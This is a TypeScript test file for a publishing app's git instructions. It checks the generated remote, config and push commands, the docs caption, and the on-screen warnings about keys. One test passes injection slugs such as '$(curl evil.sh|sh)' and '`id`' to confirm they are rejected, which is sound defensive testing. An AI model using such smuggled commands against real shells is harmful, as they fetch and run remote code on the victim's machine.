/**
 * The commands a publisher is given for git. They are run for real in apps/softn-api/test/git-push.test.mjs; what is
 * held here is what they say: the app's name in the address, so git keeps a key for each app, and never a key.
 */
import { readFileSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { act } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { afterEach, describe, expect, it } from 'vitest';
import { PushWithGit, gitCommands } from '../src/components/publish/keys';

(globalThis as unknown as { IS_REACT_ACT_ENVIRONMENT: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

let root: Root | null = null;
let host: HTMLElement | null = null;

afterEach(() => {
  act(() => root?.unmount());
  host?.remove();
  root = null;
  host = null;
});

describe('publishing with git', () => {
  it('names the app in the address, on the site it is on', () => {
    expect(gitCommands('my-app', 'https://softn.com').split('\n')).toEqual([
      'git remote add softn https://my-app@softn.com/api/git/my-app.git',
      'git config --unset remote.softn.fetch',
      'git config remote.softn.push HEAD:refs/heads/main',
      'git config remote.softn.skipFetchAll true',
      'git config http.postBuffer 64M',
      'git push softn',
    ]);
    expect(gitCommands('tide', 'http://127.0.0.1:5510')).toContain('http://tide@127.0.0.1:5510/api/git/tide.git');
  });

  it('gives lines that are the same in Command Prompt, PowerShell and a POSIX shell', () => {
    // Nothing a shell acts on: no quote, no $ or backquote, no ^ or % (Command Prompt), no ! (history), no backslash.
    for (const line of gitCommands('my-app', 'https://softn.com').split('\n')) {
      expect(line).toMatch(/^git [A-Za-z0-9 .:/@=-]+$/);
    }
  });

  it('matches the publishing guide, line for line and in what it says of them', () => {
    const docs = JSON.parse(readFileSync(resolve(dirname(fileURLToPath(import.meta.url)), '../../../docs/content/softn-docs.json'), 'utf8')) as {
      pages: { sections?: { id: string; blocks: { type: string; code?: string; caption?: string }[] }[] }[];
    };
    const block = docs.pages
      .flatMap((page) => page.sections ?? [])
      .find((section) => section.id === 'push-with-git')
      ?.blocks.find((b) => b.type === 'code');
    expect(block?.code).toBe(gitCommands('my-app', 'https://softn.com'));
    // "Run these once" over a block whose last line publishes had people publish a second copy of their first version.
    const lines = gitCommands('my-app', 'https://softn.com').split('\n');
    expect(lines[lines.length - 1]).toBe('git push softn');
    const count = ['', 'one', 'two', 'three', 'four', 'five', 'six', 'seven'][lines.length - 1];
    expect(block?.caption).toContain(`Run the first ${count} once in a project.`);
    host = document.createElement('div');
    document.body.appendChild(host);
    root = createRoot(host);
    act(() => root!.render(<PushWithGit slug="my-app" />));
    expect(host.textContent).toContain(`Run the first ${count} once in the app’s git repository`);
    expect(host.textContent).not.toContain('Run these once');
  });

  it('gives no commands for a name a shell could act on, wherever it came from', () => {
    for (const slug of ['$(curl evil.sh|sh)', '`id`', 'a b', 'a;b', 'A', '-a', '', `a${'b'.repeat(64)}`]) {
      expect(gitCommands(slug, 'https://softn.com')).toBe('');
    }
    host = document.createElement('div');
    document.body.appendChild(host);
    root = createRoot(host);
    act(() => root!.render(<PushWithGit slug="$(curl evil.sh|sh)" />));
    expect(host.textContent).toBe('');
  });

  it('shows them, and says what a push makes public', () => {
    host = document.createElement('div');
    document.body.appendChild(host);
    root = createRoot(host);
    act(() => root!.render(<PushWithGit slug="my-app" />));
    expect(host.querySelector('pre code')?.textContent).toBe(gitCommands('my-app', window.location.origin));
    expect(host.textContent).toContain('give it the edit key');
    expect(host.textContent).toContain('From then on, git push softn publishes the commit you are on, from any branch.');
    expect(host.textContent).toContain('A push of the files the latest version already has publishes nothing new.');
    expect(host.textContent).toContain('Everything in the commit is public');
    // The backup download is on the same page as these commands, and a project folder is where a download lands.
    expect(host.textContent).toContain('save the key backup file somewhere outside the project');
    expect(host.textContent).toContain('A push that holds this app’s key or a backup of keys is refused.');
  });
});
